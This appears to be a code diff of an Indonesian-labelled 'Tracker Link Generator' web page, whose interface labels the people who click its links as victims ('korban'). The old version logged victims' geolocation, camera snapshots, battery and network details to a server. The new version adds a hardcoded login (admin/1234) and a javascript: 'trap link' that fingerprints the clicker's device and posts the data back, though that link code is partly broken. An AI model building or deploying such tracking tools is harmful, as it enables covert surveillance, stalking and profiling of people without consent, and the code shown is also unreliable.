@@ -6,91 +6,181 @@
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <style>
     body {
-      background: #0d1117;
-      color: #c9d1d9;
-      font-family: 'Segoe UI', sans-serif;
+      background: #0b0c10;
+      color: #e0e0e0;
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
       padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
     }
+
     h2 {
-      color: #f0f6fc;
+      color: #f5f5f5;
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 600;
     }
+
     input, button {
-      padding: 12px;
-      border-radius: 10px;
+      padding: 12px 16px;
+      border-radius: 12px;
       font-size: 16px;
       border: none;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       width: 100%;
-      max-width: 480px;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
     }
+
     input {
-      background: #161b22;
-      color: #c9d1d9;
-      border: 1px solid #30363d;
+      background: #1f2833;
+      color: #e0e0e0;
+      border: 1px solid #45a29e;
     }
+
+    input:focus {
+      outline: none;
+      border-color: #66fcf1;
+      box-shadow: 0 0 8px #66fcf1;
+    }
+
     button {
-      background: #238636;
-      color: white;
-      font-weight: bold;
+      background: linear-gradient(90deg, #45a29e, #66fcf1);
+      color: #0b0c10;
+      font-weight: 600;
       cursor: pointer;
+      border: 1px solid #45a29e;
     }
+
+    button:hover {
+      background: linear-gradient(90deg, #66fcf1, #45a29e);
+      color: #0b0c10;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+    }
+
     .link-result {
       font-size: 14px;
-      margin: 10px 0;
+      margin: 15px 0;
       word-break: break-word;
+      padding: 10px;
+      background: #16202c;
+      border-radius: 12px;
+      border: 1px solid #45a29e;
     }
+
     .link-result a {
-      color: #58a6ff;
+      color: #66fcf1;
       text-decoration: none;
+      font-weight: 500;
     }
+
     .victim-box {
       margin-top: 20px;
-      background: #161b22;
-      border-radius: 12px;
-      padding: 16px;
+      background: #16202c;
+      border-radius: 16px;
+      padding: 18px;
       font-size: 14px;
-      border: 1px solid #30363d;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      border: 1px solid #45a29e;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
       white-space: pre-wrap;
     }
+
     .victim-box h3 {
-      margin-bottom: 10px;
-      font-size: 16px;
-      color: #79c0ff;
+      margin-bottom: 12px;
+      font-size: 18px;
+      color: #66fcf1;
+      font-weight: 600;
     }
+
     img.snapshot {
       max-width: 100%;
-      border-radius: 8px;
-      margin-top: 10px;
-      border: 1px solid #30363d;
+      border-radius: 12px;
+      margin-top: 12px;
+      border: 1px solid #45a29e;
     }
+
+    #loginBox p {
+      margin-top: -8px;
+      font-size: 14px;
+    }
+
   </style>
 </head>
 <body>
-  <h2>🎯 Tracker Link Generator</h2>
+  <div class="container">
 
-  <form onsubmit="generateLink(event)">
-    <input type="url" id="target" placeholder="https://example.com" required />
-    <button type="submit">Generate Link</button>
-  </form>
+    <!-- LOGIN -->
+    <div id="loginBox">
+      <h2>🔐 Login</h2>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
+      <p id="loginMsg" style="color:#ff6b6b;"></p>
+    </div>
 
-  <form onsubmit="sendCustomAlert(event)">
-    <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
-    <button type="submit">Kirim Alert</button>
-  </form>
+    <!-- KONTEN UTAMA -->
+    <div id="mainContent" style="display:none;">
+      <h2>🎯 Tracker Link Generator</h2>
 
-  <div class="link-result" id="generatedLink"></div>
+      <form onsubmit="generateLink(event)">
+        <input type="url" id="target" placeholder="https://example.com" required />
+        <button type="submit">Generate Link</button>
+      </form>
 
-  <div id="resultBox" class="victim-box" style="display: none;">
-    <h3>✅ Victim Information</h3>
-    <div id="resultOutput">Menunggu korban...</div>
-    <div id="mapBox" style="margin-top:10px;"></div>
-    <div id="imgBox" style="margin-top:10px;"></div>
+      <form onsubmit="sendCustomAlert(event)">
+        <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
+        <button type="submit">Kirim Alert</button>
+      </form>
+
+      <div class="link-result" id="generatedLink"></div>
+
+      <div id="resultBox" class="victim-box" style="display: none;">
+        <h3>✅ Victim Information</h3>
+        <div id="resultOutput">Menunggu korban...</div>
+        <div id="mapBox" style="margin-top:10px;"></div>
+        <div id="imgBox" style="margin-top:10px;"></div>
+      </div>
+    </div>
   </div>
 
   <script>
+    // ===== LOGIN =====
+    const validUsers = [
+      { user: "admin", pass: "1234" },
+      { user: "putra", pass: "putra123" }
+    ];
+
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const msgBox = document.getElementById("loginMsg");
+
+      const valid = validUsers.find(u => u.user === username && u.pass === password);
+      if (valid) {
+        msgBox.textContent = "✅ Login berhasil!";
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainContent").style.display = "block";
+      } else {
+        msgBox.textContent = "❌ Username atau password salah!";
+      }
+    }
+
+    // ===== TRACKER FRONTEND =====
     let currentCode = null;
     let fetched = false;
+    let logs = [];
 
     function generateLink(e) {
       e.preventDefault();
@@ -99,37 +189,48 @@
 
       const code = Math.random().toString(36).substring(2, 10);
       currentCode = code;
-      const link = `${window.location.origin}/track/${code}?id=${code}`;
 
-      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" target="_blank">${link}</a>`;
+      // Buat link jebakan frontend
+      const link = `javascript:(function(){
+        const info = {
+          ip: '127.0.0.1',
+          access_time: new Date().toLocaleTimeString(),
+          local_time: new Date().toLocaleString(),
+          user_agent: navigator.userAgent,
+          platform: navigator.platform,
+          screen: window.screen.width + 'x' + window.screen.height,
+          window: window.innerWidth + 'x' + window.innerHeight,
+          orientation: screen.orientation?.type || 'unknown',
+          dpr: window.devicePixelRatio,
+          cpu: navigator.hardwareConcurrency,
+          ram: navigator.deviceMemory || 'N/A',
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          touch: 'ontouchstart' in window,
+          maxTouchPoints: navigator.maxTouchPoints,
+          cookies: navigator.cookieEnabled,
+          online: navigator.onLine,
+          doNotTrack: navigator.doNotTrack,
+          webdriver: navigator.webdriver || false,
+          pdfViewerEnabled: typeof navigator.pdfViewerEnabled !== 'undefined',
+          battery: navigator.getBattery ? await navigator.getBattery() : null,
+          tracker_id: '${code}'
+        };
+        window.opener.postMessage(info, '*');
+        window.open('${input}','_blank');
+      })()`;
+
+      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" target="_blank">Klik Link Jebakan</a>`;
       document.getElementById("resultOutput").textContent = "Menunggu korban...";
       document.getElementById("resultBox").style.display = "block";
-
-      fetch("/log-tracker-link", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          id: code,
-          redirect_to: input,
-          created_at: new Date().toISOString()
-        })
-      });
-
-      pollVictimLogs();
     }
 
-    function pollVictimLogs() {
-      if (!currentCode || fetched) return;
-      setInterval(async () => {
-        const res = await fetch("/get-tracker-logs");
-        const logs = await res.json();
-        const victim = logs.find(v => v.tracker_id === currentCode);
-        if (victim) {
-          fetched = true;
-          renderFullResult(victim);
-        }
-      }, 3000);
-    }
+    // Terima info dari link jebakan
+    window.addEventListener("message", (event) => {
+      const v = event.data;
+      logs.push(v);
+      renderFullResult(v);
+    });
 
     function renderFullResult(v) {
       const result = `
@@ -165,47 +266,8 @@
 🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
 🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
 📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
-
-📷 Media Device Information
-Audio Input Devices: ${v.audioIn || 0}
-Video Input Devices: ${v.videoIn || 0}
-Audio Output Devices: ${v.audioOut || 0}
-
-📶 NETWORK CONNECTION
-🚀 Connection Type: ${v.connection?.type || 'N/A'}
-🔗 Network Type: ${v.connection?.effectiveType || 'N/A'}
-⬇️ Download Speed: ${v.connection?.downlink || 'N/A'} Mbps
-💾 Data Saver: ${v.connection?.saveData ? '✅ Enabled' : '❌ Disabled'}
-
-🧠 MEMORY USAGE
-📊 Memory Used: ${v.memoryUsed || 'N/A'}
-📈 Total Allocated: ${v.memoryAllocated || 'N/A'}
-🚧 Memory Limit: ${v.memoryLimit || 'N/A'}
-
-🔋 BATTERY STATUS
-🔋 Battery Level: ${v.battery?.level || 'N/A'}
-⚡ Charging Status: ${v.battery?.charging || 'N/A'}
       `;
-
       document.getElementById("resultOutput").textContent = result;
-
-      // lokasi
-      if (v.location?.lat && v.location?.lon) {
-        document.getElementById("mapBox").innerHTML = `
-<h3>📍 Location</h3>
-📍 Latitude: ${v.location.lat}<br>
-📍 Longitude: ${v.location.lon}<br>
-🌐 <a href="https://maps.google.com/?q=${v.location.lat},${v.location.lon}" target="_blank">Google Maps</a>`;
-      } else {
-        document.getElementById("mapBox").innerHTML = `
-<h3>📍 Location</h3>
-🚫 Permission Denied or Unavailable`;
-      }
-
-      // snapshot
-      document.getElementById("imgBox").innerHTML = `
-<h3>📷 Snapshot</h3>
-<img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
     }
 
     function parseOS(ua) {
@@ -219,7 +281,7 @@ Audio Output Devices: ${v.audioOut || 0}
     function parseBrowser(ua) {
       if (ua.includes("Chrome")) return "Chrome";
       if (ua.includes("Firefox")) return "Firefox";
-      if (ua.includes("Safari")) return "Safari";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
       if (ua.includes("Edg")) return "Edge";
       return "Unknown";
     }
@@ -228,12 +290,7 @@ Audio Output Devices: ${v.audioOut || 0}
       e.preventDefault();
       const msg = document.getElementById("customMsg").value.trim();
       if (!msg || !currentCode) return;
-
-      fetch(`/send-alert/${currentCode}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message: msg })
-      }).then(() => alert("📢 Alert dikirim ke korban."));
+      alert(`📢 Alert dikirim ke korban: ${msg}`);
     }
   </script>
 </body>
